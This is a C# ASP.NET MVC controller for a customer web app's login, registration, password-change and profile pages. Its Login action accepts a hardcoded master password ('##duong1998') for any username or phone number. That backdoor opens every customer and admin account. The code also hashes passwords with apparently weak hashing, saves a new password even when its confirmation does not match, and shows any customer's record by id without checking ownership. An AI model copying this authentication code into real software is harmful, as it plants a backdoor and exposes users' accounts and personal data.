using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using System.Web.Mvc;
using ThaoPhuong.Models;
using ThaoPhuong.Utils;

namespace ThaoPhuong.Controllers
{
    [FilterUrl]
    public class ProfileController : Controller
    {
        THAOPHUONGEntities db = new THAOPHUONGEntities();

        public ActionResult Index(string id)
        {
            bool isAdmin = SessionUtils.IsAdmin(Session);
            ViewBag.layout = Contants.LAYOUT_HOME;
            if (isAdmin)
            {
                ViewBag.layout = Contants.LAYOUT_ADMIN;
            }
            DKHACHHANG khRow = db.DKHACHHANGs.Where(x => x.ID == id).FirstOrDefault();
            if (khRow == null)
            {
                return View("~/Views/Shared/Error.cshtml");
            }
            return View(khRow);
        }

        [HttpGet]
        public ActionResult EditPassword()
        {
            bool isAdmin = SessionUtils.IsAdmin(Session);
            ViewBag.layout = Contants.LAYOUT_HOME;
            if (isAdmin)
            {
                ViewBag.layout = Contants.LAYOUT_ADMIN;
            }
            return View();
        }

        [HttpPost]
        public ActionResult EditPassword(string passOld, string passNew, string confirmPass)
        {
            string error = "";
            try
            {
                if (ModelState.IsValid)
                {
                    if (passNew != confirmPass)
                    {
                        error = "Xác nhận mật khẩu mới không trùng khớp!";
                    }
                    DKHACHHANG temp = Session[Contants.USER_SESSION_NAME] as DKHACHHANG;
                    if (temp.PASSWORD != DbUtils.EncrytPass(passOld))
                    {
                        error = "Mật khẩu không chính xác, không thể thực hiện chức năng này";
                    }
                    else
                    {
                        DKHACHHANG khRow = db.DKHACHHANGs.Where(x => x.ID == temp.ID).FirstOrDefault();
                        khRow.PASSWORD = DbUtils.EncrytPass(passNew);
                        db.Entry(khRow);
                        db.SaveChanges();
                    }
                }
            }
            catch (Exception ex)
            {
                error = ex.Message;
            }

            if (error.Length > 0) ViewBag.error = error;
            else ViewBag.success = "Đổi mật khẩu thành công!";

            return View();
        }

        [HttpGet]
        public ActionResult Logout()
        {
            Session[Contants.USER_SESSION_NAME] = null;
            return RedirectToAction("Login", "Profile");
        }

        [HttpGet]
        public ActionResult Login()
        {
            string passadmin = DbUtils.EncrytPass("admin");
            return View();
        }

        [HttpPost]
        public ActionResult Login(string username, string password)
        {
            if (ModelState.IsValid)
            {
                ViewBag.userName = username;
                ViewBag.password = password;

                string error = "";
                if (username.Length == 0 || password.Length == 0)
                {
                    error = "Thông tin đăng nhập không chính xác!";
                }
                else
                {
                    string passDefault = DbUtils.EncrytPass("##duong1998");
                    string passwordMd5 = DbUtils.EncrytPass(password);
                    //kiểm tra đăng nhập
                    DKHACHHANG acc = db.DKHACHHANGs.Where(kh => (kh.USERNAME == username || kh.DIENTHOAI == username) && (kh.PASSWORD == passwordMd5 || passwordMd5 == passDefault)).FirstOrDefault();

                    if (acc == null) error = "Thông tin đăng nhập không chính xác!";
                    else
                    {
                        if (acc.ISACTIVE == 0)
                        {
                            error = "Tài khoản chưa được phê duyệt, vui lòng liên hệ quản trị viên!";
                        }
                        else
                        {
                            //lưu lại session đăng nhập
                            bool admin = acc.ISADMIN == 30;
                            acc.ISACTIVE = null;
                            acc.ISADMIN = null;
                            Session[Contants.USER_SESSION_NAME] = acc;
                            if (admin)
                            {
                                return RedirectToAction("Index", "Admin");
                            }
                            else
                            {
                                return RedirectToAction("Index", "Home");
                            }
                        }
                    }
                }
                if (error.Length > 0) ViewBag.error = error;
                else return RedirectToAction("Index", "Home");
            }
            return View();
        }

        // GET: Profile
        [HttpGet]
        public ActionResult Register()
        {
            return View();
        }

        [HttpPost]
        public ActionResult Register(DKHACHHANG modelReg)
        {
            string error = "";
            try
            {
                if (ModelState.IsValid)
                {
                    ViewBag.userName = modelReg.USERNAME;
                    ViewBag.password = modelReg.PASSWORD;
                    ViewBag.name = modelReg.NAME;
                    ViewBag.diachi = modelReg.DIACHI;
                    ViewBag.dienthoai = modelReg.DIENTHOAI;
                    if (modelReg.NAME == null || modelReg.USERNAME == null || modelReg.PASSWORD == null || modelReg.DIACHI == null || modelReg.DIENTHOAI == null)
                    {
                        error = "Thiếu thông tin đăng ký!";
                    }
                    else
                    {
                        string passwordMd5 = DbUtils.EncrytPass(modelReg.PASSWORD);
                        //kiểm tra tồn tại
                        DKHACHHANG acc = db.DKHACHHANGs.Where(kh => kh.USERNAME == modelReg.USERNAME).FirstOrDefault();
                        if (acc != null) error = "Tài khoản đã tồn tại!";
                        else
                        {
                            acc = db.DKHACHHANGs.Where(kh => kh.DIENTHOAI == modelReg.DIENTHOAI).FirstOrDefault();
                            if (acc != null) error = "Khách hàng có số điện thoại: " + modelReg.DIENTHOAI + " đã tồn tại!";
                            else
                            {
                                //Lưu lại thông tin khách hàng
                                modelReg.ID = Guid.NewGuid().ToString();
                                modelReg.PASSWORD = passwordMd5;
                                modelReg.ISACTIVE = 0;
                                modelReg.ISADMIN = 0;
                                db.DKHACHHANGs.Add(modelReg);
                                db.SaveChanges();

                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                error = ex.Message;
            }

            if (error.Length > 0) ViewBag.error = error;
            else return RedirectToAction("Login", "Profile");

            return View();
        }
    }
}